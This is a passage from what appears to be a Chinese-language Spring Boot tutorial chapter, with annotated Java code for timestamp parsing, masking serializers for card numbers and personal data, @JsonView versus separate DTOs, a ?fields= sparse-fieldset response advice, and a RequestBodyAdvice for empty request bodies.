@Component
public class StringToInstantConverter implements Converter<String, Instant> {

    @Override
    public Instant convert(String source) {
        // ★ 轉換失敗時拋 IllegalArgumentException ——
        //   Spring 會包成 MethodArgumentTypeMismatchException，
        //   而 03 章的 advice 會把它轉成 422 + 明確的訊息
        return InstantParsing.parse(source);
    }
}
```

```java
package example.shop.common.web.json;

import java.time.Instant;
import java.time.LocalDate;
import java.time.OffsetDateTime;
import java.time.ZoneOffset;
import java.time.format.DateTimeParseException;

/**
 * {@link Instant} 的解析 —— <b>body 與查詢參數共用</b>（6.6.1）。
 *
 * <p>★ 把它抽成一個獨立的類別（而不是留在 deserializer 裡）
 * 是為了讓兩條路徑不可能不一致。
 */
public final class InstantParsing {

    /** @throws IllegalArgumentException 格式無效或缺少時區 */
    public static Instant parse(String text) {
        if (text == null || text.isBlank()) return null;
        String trimmed = text.trim();

        // ① epoch（秒或毫秒）
        if (trimmed.matches("^-?\\d{1,19}$")) {
            long value = Long.parseLong(trimmed);
            return (Math.abs(value) > 100_000_000_000L)
                    ? Instant.ofEpochMilli(value)
                    : Instant.ofEpochSecond(value);
        }
        // ② 標準的 Instant（…Z）
        try {
            return Instant.parse(trimmed);
        } catch (DateTimeParseException ignored) { }
        // ③ 帶偏移（…+08:00）
        try {
            return OffsetDateTime.parse(trimmed).toInstant();
        } catch (DateTimeParseException ignored) { }

        // ★ 明確拒絕「沒有時區的時間」（6.5.6 的界線）
        if (trimmed.matches("^\\d{4}-\\d{2}-\\d{2}[T ]\\d{2}:\\d{2}(:\\d{2}(\\.\\d+)?)?$")) {
            throw new IllegalArgumentException(
                    "時間必須帶時區偏移（例如 2026-08-24T03:14:22Z）。"
                    + "不帶偏移的本地時間是歧義的。");
        }
        throw new IllegalArgumentException("不是有效的 ISO-8601 時間：" + trimmed);
    }

    private InstantParsing() {}
}
```

⚠️ **`LenientInstantDeserializer`（6.5.6）要改成呼叫它** ——
那一節的實作把邏輯寫在 deserializer 裡，是為了讓那一節可以獨立讀。
**真正組裝專案時要抽出來共用**（和 04 章 4.13.6 的 `ClientIpResolver`
從 static 變成 bean 是同一類的收攏）。

**一個判斷流程**：

```
這個轉換對「這個型別的所有實例」都正確嗎？
  │
  是 ──▶ 這個型別是我們自己的嗎？
  │        │
  │        是 ──▶ 用 @JsonValue / @JsonCreator（放在型別裡，最內聚）
  │        │
  │        否 ──▶ 用 Module 註冊（Instant、UUID 這類 JDK 型別）
  │
  否 ──▶ 只對某些欄位正確
           │
           └──▶ 用 @JsonSerialize(using = ...) 標在那些欄位上
                  ⚠️ 如果要標超過 5 個地方，考慮包一個值型別
```

### 6.6.2 遮蔽序列化器：讓敏感欄位不可能外洩 ★

**問題**：03-rest-api 3.2.2 說「不要回 Entity」，
但**即使用 DTO，還是有人會把卡號放進去**。

```java
    // 某個 PR 裡出現的
    public record PaymentResponse(
        String paymentId,
        String cardNumber,        // 🔴 4111111111111111
        String cardHolderName,
        String email
    ) {}
```

**Code review 可能會抓到，也可能不會。** 一個型別層級的防護：

```java
package example.shop.common.web.json;

import com.fasterxml.jackson.annotation.JsonCreator;
import com.fasterxml.jackson.annotation.JsonValue;

/**
 * 信用卡號 —— <b>序列化時一定被遮蔽</b>。
 *
 * <p>★★ 這個型別的核心價值：
 * <b>「把卡號放進回應」在型別上就不可能造成洩漏</b>。
 * 因為 {@code @JsonValue} 回的是遮蔽後的字串，
 * 而原始值只能透過 {@link #raw()} 取得（那個方法有 {@code @JsonIgnore}）。
 *
 * <p>對照兩種防護：
 * <table>
 *   <tr><th></th><th>Code review</th><th>這個型別</th></tr>
 *   <tr><td>可靠性</td><td>⚠️ 取決於 reviewer 那天有多累</td><td>✅ 編譯期 + 執行期</td></tr>
 *   <tr><td>新人加欄位</td><td>可能漏掉</td><td>✅ 型別強迫他做對</td></tr>
 *   <tr><td>重構時</td><td>可能被搬到新的 DTO</td><td>✅ 跟著型別走</td></tr>
 * </table>
 *
 * <p>⚠️ 它<b>不</b>防止「有人呼叫 raw() 然後放進 String 欄位」——
 * 那需要 6.10.5 的回應掃描測試。兩層都要有。
 */
public final class MaskedCardNumber {

    private final String value;

    private MaskedCardNumber(String value) {
        this.value = value;
    }

    /**
     * ★ 反序列化的入口。
     *
     * <p>⚠️ 這裡刻意<b>不</b>驗證 Luhn 檢查碼 ——
     * 那是 Bean Validation 的責任（02 章 2.8.2 的 {@code @CreditCardNumber}）。
     * 型別只負責「持有與遮蔽」，驗證是另一個關注點。
     */
    @JsonCreator
    public static MaskedCardNumber of(String raw) {
        if (raw == null) return null;
        // ★ 移除空白與連字號（客戶端可能送 "4111 1111 1111 1111"）
        String digits = raw.replaceAll("[\\s-]", "");
        return new MaskedCardNumber(digits);
    }

    /**
     * ★★ 序列化的唯一出口 —— 一定是遮蔽的。
     *
     * <p>格式：保留前 6 碼（BIN，可以判斷發卡行與卡種）與後 4 碼。
     * ⚠️ PCI DSS 允許「前 6 後 4」，<b>不允許</b>顯示更多。
     */
    @JsonValue
    public String masked() {
        if (value == null || value.length() < 10) {
            return "*".repeat(Math.max(value == null ? 0 : value.length(), 4));
        }
        String bin = value.substring(0, 6);
        String last4 = value.substring(value.length() - 4);
        int middle = value.length() - 10;
        return bin + "*".repeat(middle) + last4;
    }

    /**
     * 原始值。
     *
     * <p>⚠️ {@code @JsonIgnore} 讓它絕不會被序列化，即使有人不小心
     * 讓 Jackson 用 getter 探測（例如把 {@code @JsonValue} 拿掉）。
     *
     * <p>⚠️ 唯一的合法用途是「送給金流商」。<b>絕不可以進 log</b>——
     * 04 章 4.6.4 的 {@code BodyMasker} 是第二層防護，但不要依賴它。
     */
    @com.fasterxml.jackson.annotation.JsonIgnore
    public String raw() {
        return value;
    }

    /** BIN（發卡行識別碼）—— 可以安全地記錄與統計。 */
    @com.fasterxml.jackson.annotation.JsonIgnore
    public String bin() {
        return (value == null || value.length() < 6) ? null : value.substring(0, 6);
    }

    /**
     * ★★ 覆寫 toString() 是絕對必要的。
     *
     * <p>沒有它的話，任何 {@code log.info("payment={}", payment)}
     * （payment 是一個含 MaskedCardNumber 的 record）
     * 都會印出<b>完整卡號</b> —— 因為 record 的自動 toString() 會呼叫
     * 元件的 toString()，而預設的 Object.toString() 不會，
     * 但如果有人手動加了一個回傳 value 的 toString() 就會。
     *
     * <p>更重要的是：<b>明確覆寫它讓「安全」變成預設行為</b>。
     */
    @Override
    public String toString() {
        return masked();
    }

    @Override
    public boolean equals(Object o) {
        return o instanceof MaskedCardNumber other
                && java.util.Objects.equals(value, other.value);
    }

    @Override
    public int hashCode() {
        return java.util.Objects.hashCode(value);
    }
}
```

**一個通用的遮蔽 serializer**（給 email、電話這類「格式固定」的欄位）：

```java
package example.shop.common.web.json;

import com.fasterxml.jackson.core.JsonGenerator;
import com.fasterxml.jackson.databind.BeanProperty;
import com.fasterxml.jackson.databind.JsonMappingException;
import com.fasterxml.jackson.databind.SerializerProvider;
import com.fasterxml.jackson.databind.ser.ContextualSerializer;
import com.fasterxml.jackson.databind.ser.std.StdSerializer;

import java.io.IOException;

/**
 * 依 {@link Masked} 註解遮蔽字串欄位。
 *
 * <p>★ 這是一個 {@link ContextualSerializer}：
 * 它在「知道自己被用在哪個欄位上」之後才決定行為 ——
 * 那讓同一個 serializer 可以依註解參數做不同的遮蔽。
 *
 * <p>⚠️ {@code ContextualSerializer} 的 {@code createContextual}
 * 在<b>每個欄位第一次序列化時</b>被呼叫一次（結果會被 Jackson 快取），
 * 所以可以放稍微貴一點的邏輯，但不要放 I/O。
 */
public class MaskingSerializer extends StdSerializer<String>
        implements ContextualSerializer {

    private final Masked.Style style;

    public MaskingSerializer() {
        this(Masked.Style.MIDDLE);
    }

    private MaskingSerializer(Masked.Style style) {
        super(String.class);
        this.style = style;
    }

    @Override
    public com.fasterxml.jackson.databind.JsonSerializer<?> createContextual(
            SerializerProvider provider, BeanProperty property) throws JsonMappingException {

        if (property == null) {
            return this;
        }
        Masked annotation = property.getAnnotation(Masked.class);
        if (annotation == null) {
            annotation = property.getContextAnnotation(Masked.class);
        }
        return new MaskingSerializer(
                annotation == null ? Masked.Style.MIDDLE : annotation.value());
    }

    @Override
    public void serialize(String value, JsonGenerator gen, SerializerProvider provider)
            throws IOException {
        gen.writeString(mask(value, style));
    }

    static String mask(String value, Masked.Style style) {
        if (value == null || value.isEmpty()) return value;

        return switch (style) {
            case EMAIL -> maskEmail(value);
            case PHONE -> maskTail(value, 3);
            case MIDDLE -> maskMiddle(value);
            case FULL -> "*".repeat(Math.min(value.length(), 8));
        };
    }

    /** {@code gary.cai@example.com} → {@code g***i@example.com} */
    private static String maskEmail(String value) {
        int at = value.indexOf('@');
        if (at <= 0) return maskMiddle(value);
        String local = value.substring(0, at);
        String domain = value.substring(at);
        if (local.length() <= 2) {
            return "*".repeat(local.length()) + domain;
        }
        return local.charAt(0) + "***" + local.charAt(local.length() - 1) + domain;
    }

    /** {@code 0912345678} → {@code *******678} */
    private static String maskTail(String value, int keep) {
        if (value.length() <= keep) return "*".repeat(value.length());
        return "*".repeat(value.length() - keep) + value.substring(value.length() - keep);
    }

    /** {@code 王大明} → {@code 王*明}；{@code A123456789} → {@code A*******9} */
    private static String maskMiddle(String value) {
        if (value.length() <= 2) return "*".repeat(value.length());
        return value.charAt(0) + "*".repeat(value.length() - 2)
                + value.charAt(value.length() - 1);
    }
}
```

```java
package example.shop.common.web.json;

import com.fasterxml.jackson.annotation.JacksonAnnotationsInside;
import com.fasterxml.jackson.databind.annotation.JsonSerialize;

import java.lang.annotation.ElementType;
import java.lang.annotation.Retention;
import java.lang.annotation.RetentionPolicy;
import java.lang.annotation.Target;

/**
 * 標記一個「序列化時要遮蔽」的字串欄位。
 *
 * <p>★ {@code @JacksonAnnotationsInside} 讓這個註解成為一個
 * <b>組合註解</b>（meta-annotation）—— 用它就等於同時用了
 * {@code @JsonSerialize(using = MaskingSerializer.class)}。
 *
 * <p>好處：DTO 上只看到一個語意清楚的 {@code @Masked(EMAIL)}，
 * 而不是一個技術性的 {@code @JsonSerialize(using = ...)}。
 */
@JacksonAnnotationsInside
@JsonSerialize(using = MaskingSerializer.class)
@Target({ElementType.FIELD, ElementType.METHOD, ElementType.RECORD_COMPONENT})
@Retention(RetentionPolicy.RUNTIME)
public @interface Masked {

    Style value() default Style.MIDDLE;

    enum Style {
        /** {@code g***y@example.com} */
        EMAIL,
        /** {@code *******678} */
        PHONE,
        /** {@code 王*明} */
        MIDDLE,
        /** {@code ********} */
        FULL
    }
}
```

**用起來**：

```java
package example.shop.order.web.dto;

import example.shop.common.web.json.Masked;
import example.shop.common.web.json.MaskedCardNumber;

/**
 * 給【客服】看的訂單詳情。
 *
 * <p>★ 對照 {@code OrderDetail}（給客戶自己看的）：
 * 客服看得到更多欄位，但敏感資料一律遮蔽 ——
 * 客服需要「後四碼」來核對，不需要完整卡號。
 *
 * <p>⚠️ 這正是 03-rest-api 3.2.7「為不同場景設計不同表述」的落地。
 */
public record OrderDetailForSupport(

    String orderId,
    String customerId,

    /** ★ 客服看得到姓名，但遮蔽中間（避免整份客戶名單被匯出） */
    @Masked(Masked.Style.MIDDLE)
    String customerName,

    @Masked(Masked.Style.EMAIL)
    String customerEmail,

    @Masked(Masked.Style.PHONE)
    String customerPhone,

    /** ★ 型別本身就保證遮蔽（6.6.2） */
    MaskedCardNumber cardNumber,

    String status,
    String statusLabel,
    Amounts amounts,

    /** ★ 客服專屬：內部備註 */
    String internalNote,

    /** ★ 客服專屬：風控分數 */
    Integer riskScore

) {}
```

⚠️ **一個重要的限制：`@Masked` 只影響序列化，不影響 log。**

```java
    log.info("處理訂單 detail={}", detailForSupport);
    // 🔴 record 的 toString() 印出【原始】的 customerEmail
```

**兩個解法**：

```java
    // ✅ 解法 1：不要 log 整個 DTO（一般原則）
    log.info("處理訂單 orderId={} customerId={}", detail.orderId(), detail.customerId());

    // ✅ 解法 2：DTO 覆寫 toString()
    @Override
    public String toString() {
        return "OrderDetailForSupport[orderId=%s, customerId=%s, status=%s]"
                .formatted(orderId, customerId, status);
    }
```

**shop-service 用解法 1，並用一個 ArchUnit 規則守住它**：

```java
    /**
     * 「不可以把 DTO 整個丟進 log」的規則。
     *
     * <p>⚠️ 這條規則很難用 ArchUnit 精確表達（它看不到 log 呼叫的參數型別）。
     * <b>更實用的做法是一個 grep 型的檢查</b>：
     */
    // scripts/check-dto-logging.sh
```

```bash
#!/usr/bin/env bash
# scripts/check-dto-logging.sh
#
# 找出「把整個 DTO 物件丟進 log」的可疑寫法。
#
# ★ 這是一個「寧可誤報也不要漏報」的檢查 ——
#   誤報的處理方式是在那一行加 // NOSONAR-dto-log 註解並說明理由。
set -euo pipefail

echo "檢查 DTO 是否被整個記錄到 log…"

# 找出 log 呼叫裡出現「看起來像 DTO 變數」的參數。
# 啟發式：變數名以 request / response / detail / dto / summary 結尾，
#         且不是 .something() 的形式（那是取欄位，安全）
violations=$(grep -rnE \
  'log\.(trace|debug|info|warn|error)\(.*\{\}.*,\s*[a-z][A-Za-z0-9]*(Request|Response|Detail|Dto|Summary|Command)\s*[,)]' \
  --include='*.java' src/main/java \
  | grep -v 'NOSONAR-dto-log' || true)

if [ -n "$violations" ]; then
  echo "🔴 發現可能把整個 DTO 記錄到 log 的地方（06 章 6.6.2）："
  echo "$violations"
  echo
  echo "DTO 的 toString() 會印出未遮蔽的敏感欄位（email、姓名、卡號）。"
  echo "請改成只記錄需要的欄位："
  echo '  log.info("處理訂單 orderId={} status={}", req.orderId(), req.status());'
  echo
  echo "如果這一行確實安全（DTO 不含個資），請加註解："
  echo '  log.debug("filter={}", filter);   // NOSONAR-dto-log: OrderFilter 只有查詢條件'
  exit 1
fi

echo "✅ 沒有發現問題"
```

### 6.6.3 `@JsonView` vs 多個 DTO

**需求**：同一個訂單，客戶看到 12 個欄位，客服看到 18 個，倉庫看到 6 個。

**做法 A：三個 DTO**（shop-service 的選擇）

```java
public record OrderDetail(...)            // 12 個欄位
public record OrderDetailForSupport(...)  // 18 個欄位
public record OrderDetailForWarehouse(...)// 6 個欄位
```

**做法 B：一個 DTO + `@JsonView`**

```java
package example.shop.order.web.dto;

import com.fasterxml.jackson.annotation.JsonView;

public class OrderViews {
    /** 客戶自己看得到的。 */
    public interface Customer {}
    /** 客服看得到的（含 Customer 的全部）。 */
    public interface Support extends Customer {}
    /** 倉庫看得到的。 */
    public interface Warehouse {}
}

public record OrderDetailWithViews(

    @JsonView({OrderViews.Customer.class, OrderViews.Warehouse.class})
    String orderId,

    @JsonView(OrderViews.Customer.class)
    Amounts amounts,

    @JsonView(OrderViews.Support.class)
    String internalNote,

    @JsonView(OrderViews.Support.class)
    Integer riskScore,

    @JsonView(OrderViews.Warehouse.class)
    java.util.List<PickingItem> pickingList

) {}
```

```java
    @GetMapping("/orders/{orderId}")
    @JsonView(OrderViews.Customer.class)
    public OrderDetailWithViews get(...) { }
```

**對照**：

| 面向 | 三個 DTO | 一個 DTO + `@JsonView` |
|---|---|---|
| 檔案數 | 3（+3 個 mapper 方法） | 1 |
| **「哪個角色看到哪些欄位」是否一目了然** | ⚠️ 要比較三個檔案 | ✅ 在一個檔案裡 |
| **編譯期保證** | ✅ mapper 不可能填錯欄位 | 🔴 **忘記標 `@JsonView` = 欄位對所有人可見** |
| **OpenAPI** | ✅ 三個明確的 schema | 🔴 **產生器通常只看到「全部欄位」的 schema** |
| **測試** | ✅ 型別本身就是斷言 | ⚠️ 要為每個 view 寫「不該出現的欄位」測試 |
| 新增一個角色 | 多一個 DTO + mapper | 多一個 interface + 標註 |
| **忘記處理時的後果** | 編譯錯誤 | **靜默洩漏** 🔴 |

⚠️ **最後一列是決定性的**：

```java
public record OrderDetailWithViews(
    // ...
    // 新人加了一個欄位，忘記標 @JsonView
    String customerIdNumber          // 🔴 身分證號，對所有 view 可見
) {}
```

**`MapperFeature.DEFAULT_VIEW_INCLUSION`**：

| 設定 | 沒標 `@JsonView` 的欄位 |
|---|---|
| `true`（Jackson 預設） | 🔴 **出現在所有 view** |
| `false`（Spring Boot 的預設） | ✅ 不出現在任何 view |

**Spring Boot 已經把它設成 `false`** —— 這是好事。
但那讓另一個 bug 出現：**忘記標註的欄位「完全不出現」**，
而那是一個「功能沒做出來」的 bug（比洩漏好，但仍然要靠測試發現）。

**shop-service 選三個 DTO 的最終理由**：

> **`@JsonView` 把「誰能看什麼」變成一個註解問題，
> 而三個 DTO 把它變成一個型別問題。**
> 型別問題由編譯器檢查，註解問題由人檢查。
> 在「洩漏個資」這個等級的風險上，我們要編譯器。

⚠️ **但 `@JsonView` 有一個 shop-service 真的用它的地方**：

```java
package example.shop.product.web.dto;

import com.fasterxml.jackson.annotation.JsonView;

/**
 * 商品的表述。
 *
 * <p>★ 這裡用 {@code @JsonView} 而不是兩個 DTO，
 * 因為兩個 view 的差別只有<b>「摘要」與「完整」</b>（同一組欄位的子集），
 * 而不是「不同角色的不同資料」。
 *
 * <p>判準：
 * <ul>
 *   <li>差別是<b>資料量</b>（列表 vs 詳情）→ {@code @JsonView} 或
 *       {@code ?fields=}（6.6.4）可以接受。</li>
 *   <li>差別是<b>權限</b>（客戶 vs 客服）→ <b>一定用不同的 DTO</b>。</li>
 * </ul>
 * 因為前者「漏標註」的後果是「列表回應變大」，後者是「個資洩漏」。
 */
public record ProductResponse(

    @JsonView({ProductViews.Summary.class, ProductViews.Full.class})
    String productId,

    @JsonView({ProductViews.Summary.class, ProductViews.Full.class})
    String name,

    @JsonView({ProductViews.Summary.class, ProductViews.Full.class})
    String thumbnailUrl,

    @JsonView({ProductViews.Summary.class, ProductViews.Full.class})
    String price,

    // ── 只在詳情出現（列表 20 筆 × 這些欄位 = 回應大 8 倍）──────
    @JsonView(ProductViews.Full.class)
    String description,

    @JsonView(ProductViews.Full.class)
    java.util.List<String> imageUrls,

    @JsonView(ProductViews.Full.class)
    java.util.List<SpecificationEntry> specifications,

    @JsonView(ProductViews.Full.class)
    java.util.List<ProductVariant> variants

) {}
```

### 6.6.4 `ResponseBodyAdvice`：稀疏欄位集（`?fields=`）

**需求**（03-rest-api 3.8.3）：讓客戶端指定只要哪些欄位。

```http
GET /orders/ord_1?fields=orderId,status,amounts.total
```

```json
{
  "orderId": "ord_1",
  "status": "PAID",
  "amounts": { "total": "1280.50" }
}
```

**為什麼值得做**：

```
訂單列表（20 筆的完整 OrderSummary）：約 42 KB
只要 orderId + status + total：           約 2.1 KB

★ 手機的訂單列表頁只顯示這三個欄位 →
  在 3G 網路下從 3.2 秒變成 0.4 秒
```

```java
package example.shop.common.web;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.node.ArrayNode;
import com.fasterxml.jackson.databind.node.ObjectNode;
import com.fasterxml.jackson.databind.JsonNode;
import example.shop.common.error.ErrorCode;
import org.springframework.core.MethodParameter;
import org.springframework.http.MediaType;
import org.springframework.http.server.ServerHttpRequest;
import org.springframework.http.server.ServerHttpResponse;
import org.springframework.http.server.ServletServerHttpRequest;
import org.springframework.http.converter.HttpMessageConverter;
import org.springframework.http.converter.json.MappingJackson2HttpMessageConverter;
import org.springframework.web.bind.annotation.RestControllerAdvice;
import org.springframework.web.servlet.mvc.method.annotation.ResponseBodyAdvice;

import java.util.*;

/**
 * 稀疏欄位集（{@code ?fields=}）。
 *
 * <p>★★ 三個關鍵的排除條件（見 {@link #supports}）：
 * <ol>
 *   <li><b>不處理 {@code Problem}</b> —— 錯誤回應的欄位是契約的一部分，
 *       被裁切會讓客戶端拿不到 {@code code} 或 {@code userMessage}。
 *       ⚠️ 這個排除是必要的，因為 {@code ResponseBodyAdvice}
 *       <b>也會作用在 {@code @ExceptionHandler} 的回傳值上</b>。</li>
 *   <li><b>不處理串流</b> —— 見 6.6.6（其實 Spring 根本不會呼叫我們，
 *       但寫出來讓讀者知道）。</li>
 *   <li><b>只處理 JSON</b> —— CSV 的欄位由 {@code CsvRowMapper} 決定。</li>
 * </ol>
 *
 * <p>⚠️ 這個 advice 的成本：它把已序列化的物件<b>再轉成 JsonNode 樹</b>，
 * 裁切之後才寫出。也就是「序列化兩次」。
 * 所以只有在 {@code ?fields=} 真的出現時才做（{@link #supports} 拿不到請求，
 * 所以檢查放在 {@link #beforeBodyWrite} 的第一行）。
 */
@RestControllerAdvice
public class SparseFieldsetAdvice implements ResponseBodyAdvice<Object> {

    /** 欄位路徑的數量上限 —— 防止 {@code ?fields=a,b,c,…}（一萬個）耗 CPU。 */
    private static final int MAX_FIELDS = 50;

    /** 單一路徑的深度上限（{@code a.b.c.d} 是 4）。 */
    private static final int MAX_DEPTH = 4;

    private final ObjectMapper objectMapper;

    public SparseFieldsetAdvice(ObjectMapper objectMapper) {
        this.objectMapper = objectMapper;
    }

    @Override
    public boolean supports(MethodParameter returnType,
                            Class<? extends HttpMessageConverter<?>> converterType) {
        // ★ 排除條件 3：只處理 Jackson 寫出的回應
        if (!MappingJackson2HttpMessageConverter.class.isAssignableFrom(converterType)) {
            return false;
        }
        // ★ 排除條件 1：Problem 不可被裁切
        Class<?> parameterType = returnType.getParameterType();
        if (Problem.class.isAssignableFrom(parameterType)) {
            return false;
        }
        // ⚠️ ResponseEntity<Problem> 的 parameterType 是 ResponseEntity，
        //    所以要看泛型
        if (org.springframework.http.ResponseEntity.class.isAssignableFrom(parameterType)) {
            var generic = org.springframework.core.ResolvableType
                    .forMethodParameter(returnType).getGeneric(0).resolve();
            if (generic != null && Problem.class.isAssignableFrom(generic)) {
                return false;
            }
        }
        return true;
    }

    @Override
    public Object beforeBodyWrite(Object body, MethodParameter returnType,
                                  MediaType selectedContentType,
                                  Class<? extends HttpMessageConverter<?>> converterType,
                                  ServerHttpRequest request, ServerHttpResponse response) {

        if (body == null) return null;

        // ★ 第二層排除：runtime 才知道的 Problem
        //   （例如方法宣告回 Object，實際回 Problem）
        if (body instanceof Problem) return body;

        String rawFields = queryParam(request, "fields");
        if (rawFields == null || rawFields.isBlank()) {
            return body;                    // ★ 沒用這個功能 → 零成本
        }

        FieldTree tree = parse(rawFields);

        // ★ Vary: 讓快取知道回應依 fields 而異
        //   ⚠️ Vary 只能列 header，不能列 query 參數 ——
        //      而 query 參數本來就是 cache key 的一部分，所以其實不需要。
        //      這裡加的是「告訴客戶端這個回應是裁切過的」。
        response.getHeaders().add("X-Sparse-Fields", String.join(",", tree.topLevelNames()));

        JsonNode full = objectMapper.valueToTree(body);
        return prune(full, tree);
    }

    private static String queryParam(ServerHttpRequest request, String name) {
        if (request instanceof ServletServerHttpRequest servlet) {
            return servlet.getServletRequest().getParameter(name);
        }
        List<String> values = request.getURI().getQuery() == null
                ? List.of()
                : org.springframework.web.util.UriComponentsBuilder
                        .fromUri(request.getURI()).build().getQueryParams().get(name);
        return (values == null || values.isEmpty()) ? null : values.get(0);
    }

    // ── 解析 ──────────────────────────────────────────────────────

    /**
     * 把 {@code "orderId,status,amounts.total"} 解析成一棵樹。
     *
     * <p>⚠️ 每一步都要驗證 —— {@code fields} 是客戶端可控的字串。
     */
    static FieldTree parse(String raw) {
        String[] paths = raw.split(",");
        if (paths.length > MAX_FIELDS) {
            throw new SparseFieldsetException(
                    "fields 最多 %d 個欄位，收到 %d 個".formatted(MAX_FIELDS, paths.length),
                    Map.of("maxFields", MAX_FIELDS, "receivedFields", paths.length));
        }

        FieldTree root = new FieldTree();
        for (String path : paths) {
            String trimmed = path.trim();
            if (trimmed.isEmpty()) continue;

            String[] segments = trimmed.split("\\.");
            if (segments.length > MAX_DEPTH) {
                throw new SparseFieldsetException(
                        "欄位路徑最深 %d 層，收到「%s」".formatted(MAX_DEPTH, trimmed),
                        Map.of("maxDepth", MAX_DEPTH, "path", trimmed));
            }

            FieldTree current = root;
            for (String segment : segments) {
                // ★ 白名單驗證：只允許 camelCase 的識別字
                //   ⚠️ 沒有這一條，客戶端可以送 "__proto__" 或含控制字元的字串
                if (!segment.matches("^[a-zA-Z][a-zA-Z0-9]{0,63}$")) {
                    throw new SparseFieldsetException(
                            "無效的欄位名稱「%s」".formatted(
                                    ValueMasker.mask(segment)),
                            Map.of("hint", "欄位名稱只能是英數字，且以字母開頭"));
                }
                current = current.child(segment);
            }
        }
        return root;
    }

    // ── 裁切 ──────────────────────────────────────────────────────

    private JsonNode prune(JsonNode node, FieldTree tree) {
        if (node.isArray()) {
            ArrayNode result = objectMapper.createArrayNode();
            for (JsonNode element : node) {
                result.add(prune(element, tree));
            }
            return result;
        }
        if (!node.isObject() || tree.isLeaf()) {
            return node;
        }

        ObjectNode result = objectMapper.createObjectNode();
        for (Map.Entry<String, FieldTree> entry : tree.children().entrySet()) {
            String name = entry.getKey();
            JsonNode child = node.get(name);
            if (child == null) {
                // ⚠️ 客戶端要了一個不存在的欄位 —— 靜默忽略還是報錯？
                //   shop-service 選【靜默忽略】，理由：
                //     · 打錯字的成本是「少一個欄位」，客戶端會立刻發現
                //     · 而報錯會讓「新版客戶端向舊版 API 要新欄位」整個失敗
                //   ★ 但要在回應標頭裡告知（見 beforeBodyWrite 的 X-Sparse-Fields）
                continue;
            }
            result.set(name, prune(child, entry.getValue()));
        }
        return result;
    }

    // ── 支援型別 ──────────────────────────────────────────────────

    /** 一棵「要保留哪些欄位」的樹。 */
    static final class FieldTree {
        private final Map<String, FieldTree> children = new LinkedHashMap<>();

        FieldTree child(String name) {
            return children.computeIfAbsent(name, k -> new FieldTree());
        }

        boolean isLeaf() { return children.isEmpty(); }

        Map<String, FieldTree> children() { return children; }

        List<String> topLevelNames() { return List.copyOf(children.keySet()); }
    }

    /** {@code ?fields=} 的值無效。 */
    public static class SparseFieldsetException
            extends example.shop.common.error.BusinessException {
        public SparseFieldsetException(String detail, Map<String, Object> extensions) {
            super(ErrorCode.VALIDATION_FAILED, detail, null, extensions,
                  new Object[0], List.of());
        }
    }
}
```

⚠️ **`fields` 也要加進 `UnknownQueryParamInterceptor` 的白名單**（01 章 1.7.5）——
和 6.4.3 的 `format` 同樣的問題。

⚠️ **三個容易做錯的地方**：

| 陷阱 | 說明 |
|---|---|
| **忘記排除 `Problem`** | 客戶端帶 `?fields=orderId` 時發生錯誤 → Problem JSON 被裁切成 `{}` → **前端拿到一個空物件，完全不知道發生什麼事** |
| **序列化兩次的成本** | `valueToTree` + 寫出 = 約 2.3 倍的 CPU。所以 `fields` 沒出現時要 early return |
| **不驗證欄位名** | 客戶端送 `?fields=` + 一萬個逗號 → CPU 燒掉 |

**一個必須有的測試**：

```java
    @Test
    @DisplayName("★ 帶 ?fields= 時，錯誤回應【不】被裁切")
    void 錯誤回應不被裁切() throws Exception {
        mockMvc.perform(get("/orders/ord_notexist")
                        .param("fields", "orderId")
                        .with(customer("cus_1")))
                .andExpect(status().isNotFound())
                // ★ Problem 的所有必填欄位都要在
                .andExpect(jsonPath("$.code").value("RESOURCE_NOT_FOUND"))
                .andExpect(jsonPath("$.userMessage").exists())
                .andExpect(jsonPath("$.traceId").exists())
                .andExpect(jsonPath("$.status").value(404));
    }
```

### 6.6.5 `RequestBodyAdvice`：對稱的那一半 ★

`ResponseBodyAdvice` 有一個對稱的兄弟，而它幾乎沒有人提。

```java
public interface RequestBodyAdvice {
    boolean supports(MethodParameter param, Type targetType,
                     Class<? extends HttpMessageConverter<?>> converterType);

    /** ① 反序列化「之前」—— 可以換掉 InputStream。 */
    HttpInputMessage beforeBodyRead(HttpInputMessage in, MethodParameter param,
            Type targetType, Class<? extends HttpMessageConverter<?>> converterType)
            throws IOException;

    /** ② 反序列化「之後」—— 可以換掉物件。 */
    Object afterBodyRead(Object body, HttpInputMessage in, MethodParameter param,
            Type targetType, Class<? extends HttpMessageConverter<?>> converterType);

    /** ③ ★ body 是空的時候 —— 這是它最有價值的一個 hook。 */
    Object handleEmptyBody(Object body, HttpInputMessage in, MethodParameter param,
            Type targetType, Class<? extends HttpMessageConverter<?>> converterType);
}
```

**`RequestBodyAdviceAdapter` 提供了預設實作，只覆寫你需要的。**

**三個真正的用途**：

| 用途 | 用哪個 hook | 為什麼別的機制做不到 |
|---|---|---|
| **① 欄位層級加密的 body** | `beforeBodyRead` | 要在 Jackson 看到它之前解密 |
| **② 稽核「原始請求內容」** | `beforeBodyRead` | 04 章的 `CachedBodyFilter` 拿得到 bytes，但**不知道它會綁到哪個 DTO** |
| **③ 空 body 的明確錯誤** | `handleEmptyBody` | 預設的錯誤訊息很難懂 |

**★ 用途 ③ 值得展開，因為它修掉一個實際的體驗問題。**

```
POST /orders
Content-Type: application/json
（body 是空的）
```

**Spring 的預設行為**：`HttpMessageNotReadableException`，訊息是

```
Required request body is missing: public org.springframework.http.ResponseEntity
<example.shop.order.web.dto.CreateOrderResponse> example.shop.order.web.
OrderController.create(example.shop.order.web.dto.CreateOrderRequest,
example.shop.order.domain.Actor)
```

03 章 3.9 的 `MessageNotReadableAnalyzer` 會把它轉成 400 `MALFORMED_REQUEST`，
但 `detail` 只能說「請求內容無法解析」—— **而真正的原因是「你根本沒送 body」**，
那是一個完全不同的問題（通常是客戶端的 `fetch` 忘了 `body:`）。

```java
package example.shop.common.web;

import example.shop.common.error.ErrorCode;
import example.shop.common.error.BusinessException;
import org.springframework.core.MethodParameter;
import org.springframework.http.HttpInputMessage;
import org.springframework.http.converter.HttpMessageConverter;
import org.springframework.web.bind.annotation.RestControllerAdvice;
import org.springframework.web.servlet.mvc.method.annotation.RequestBodyAdviceAdapter;

import java.lang.reflect.Type;

/**
 * 讓「沒送 body」有一個看得懂的錯誤。
 *
 * <p>★ 為什麼用 RequestBodyAdvice 而不是在 advice 裡分析例外訊息：
 *    因為到了 advice 那一層，你只剩下一個字串可以做正規表示式 ——
 *    而這裡拿得到 {@code MethodParameter}，可以說出
 *    「這個端點需要一個 CreateOrderRequest」。
 *
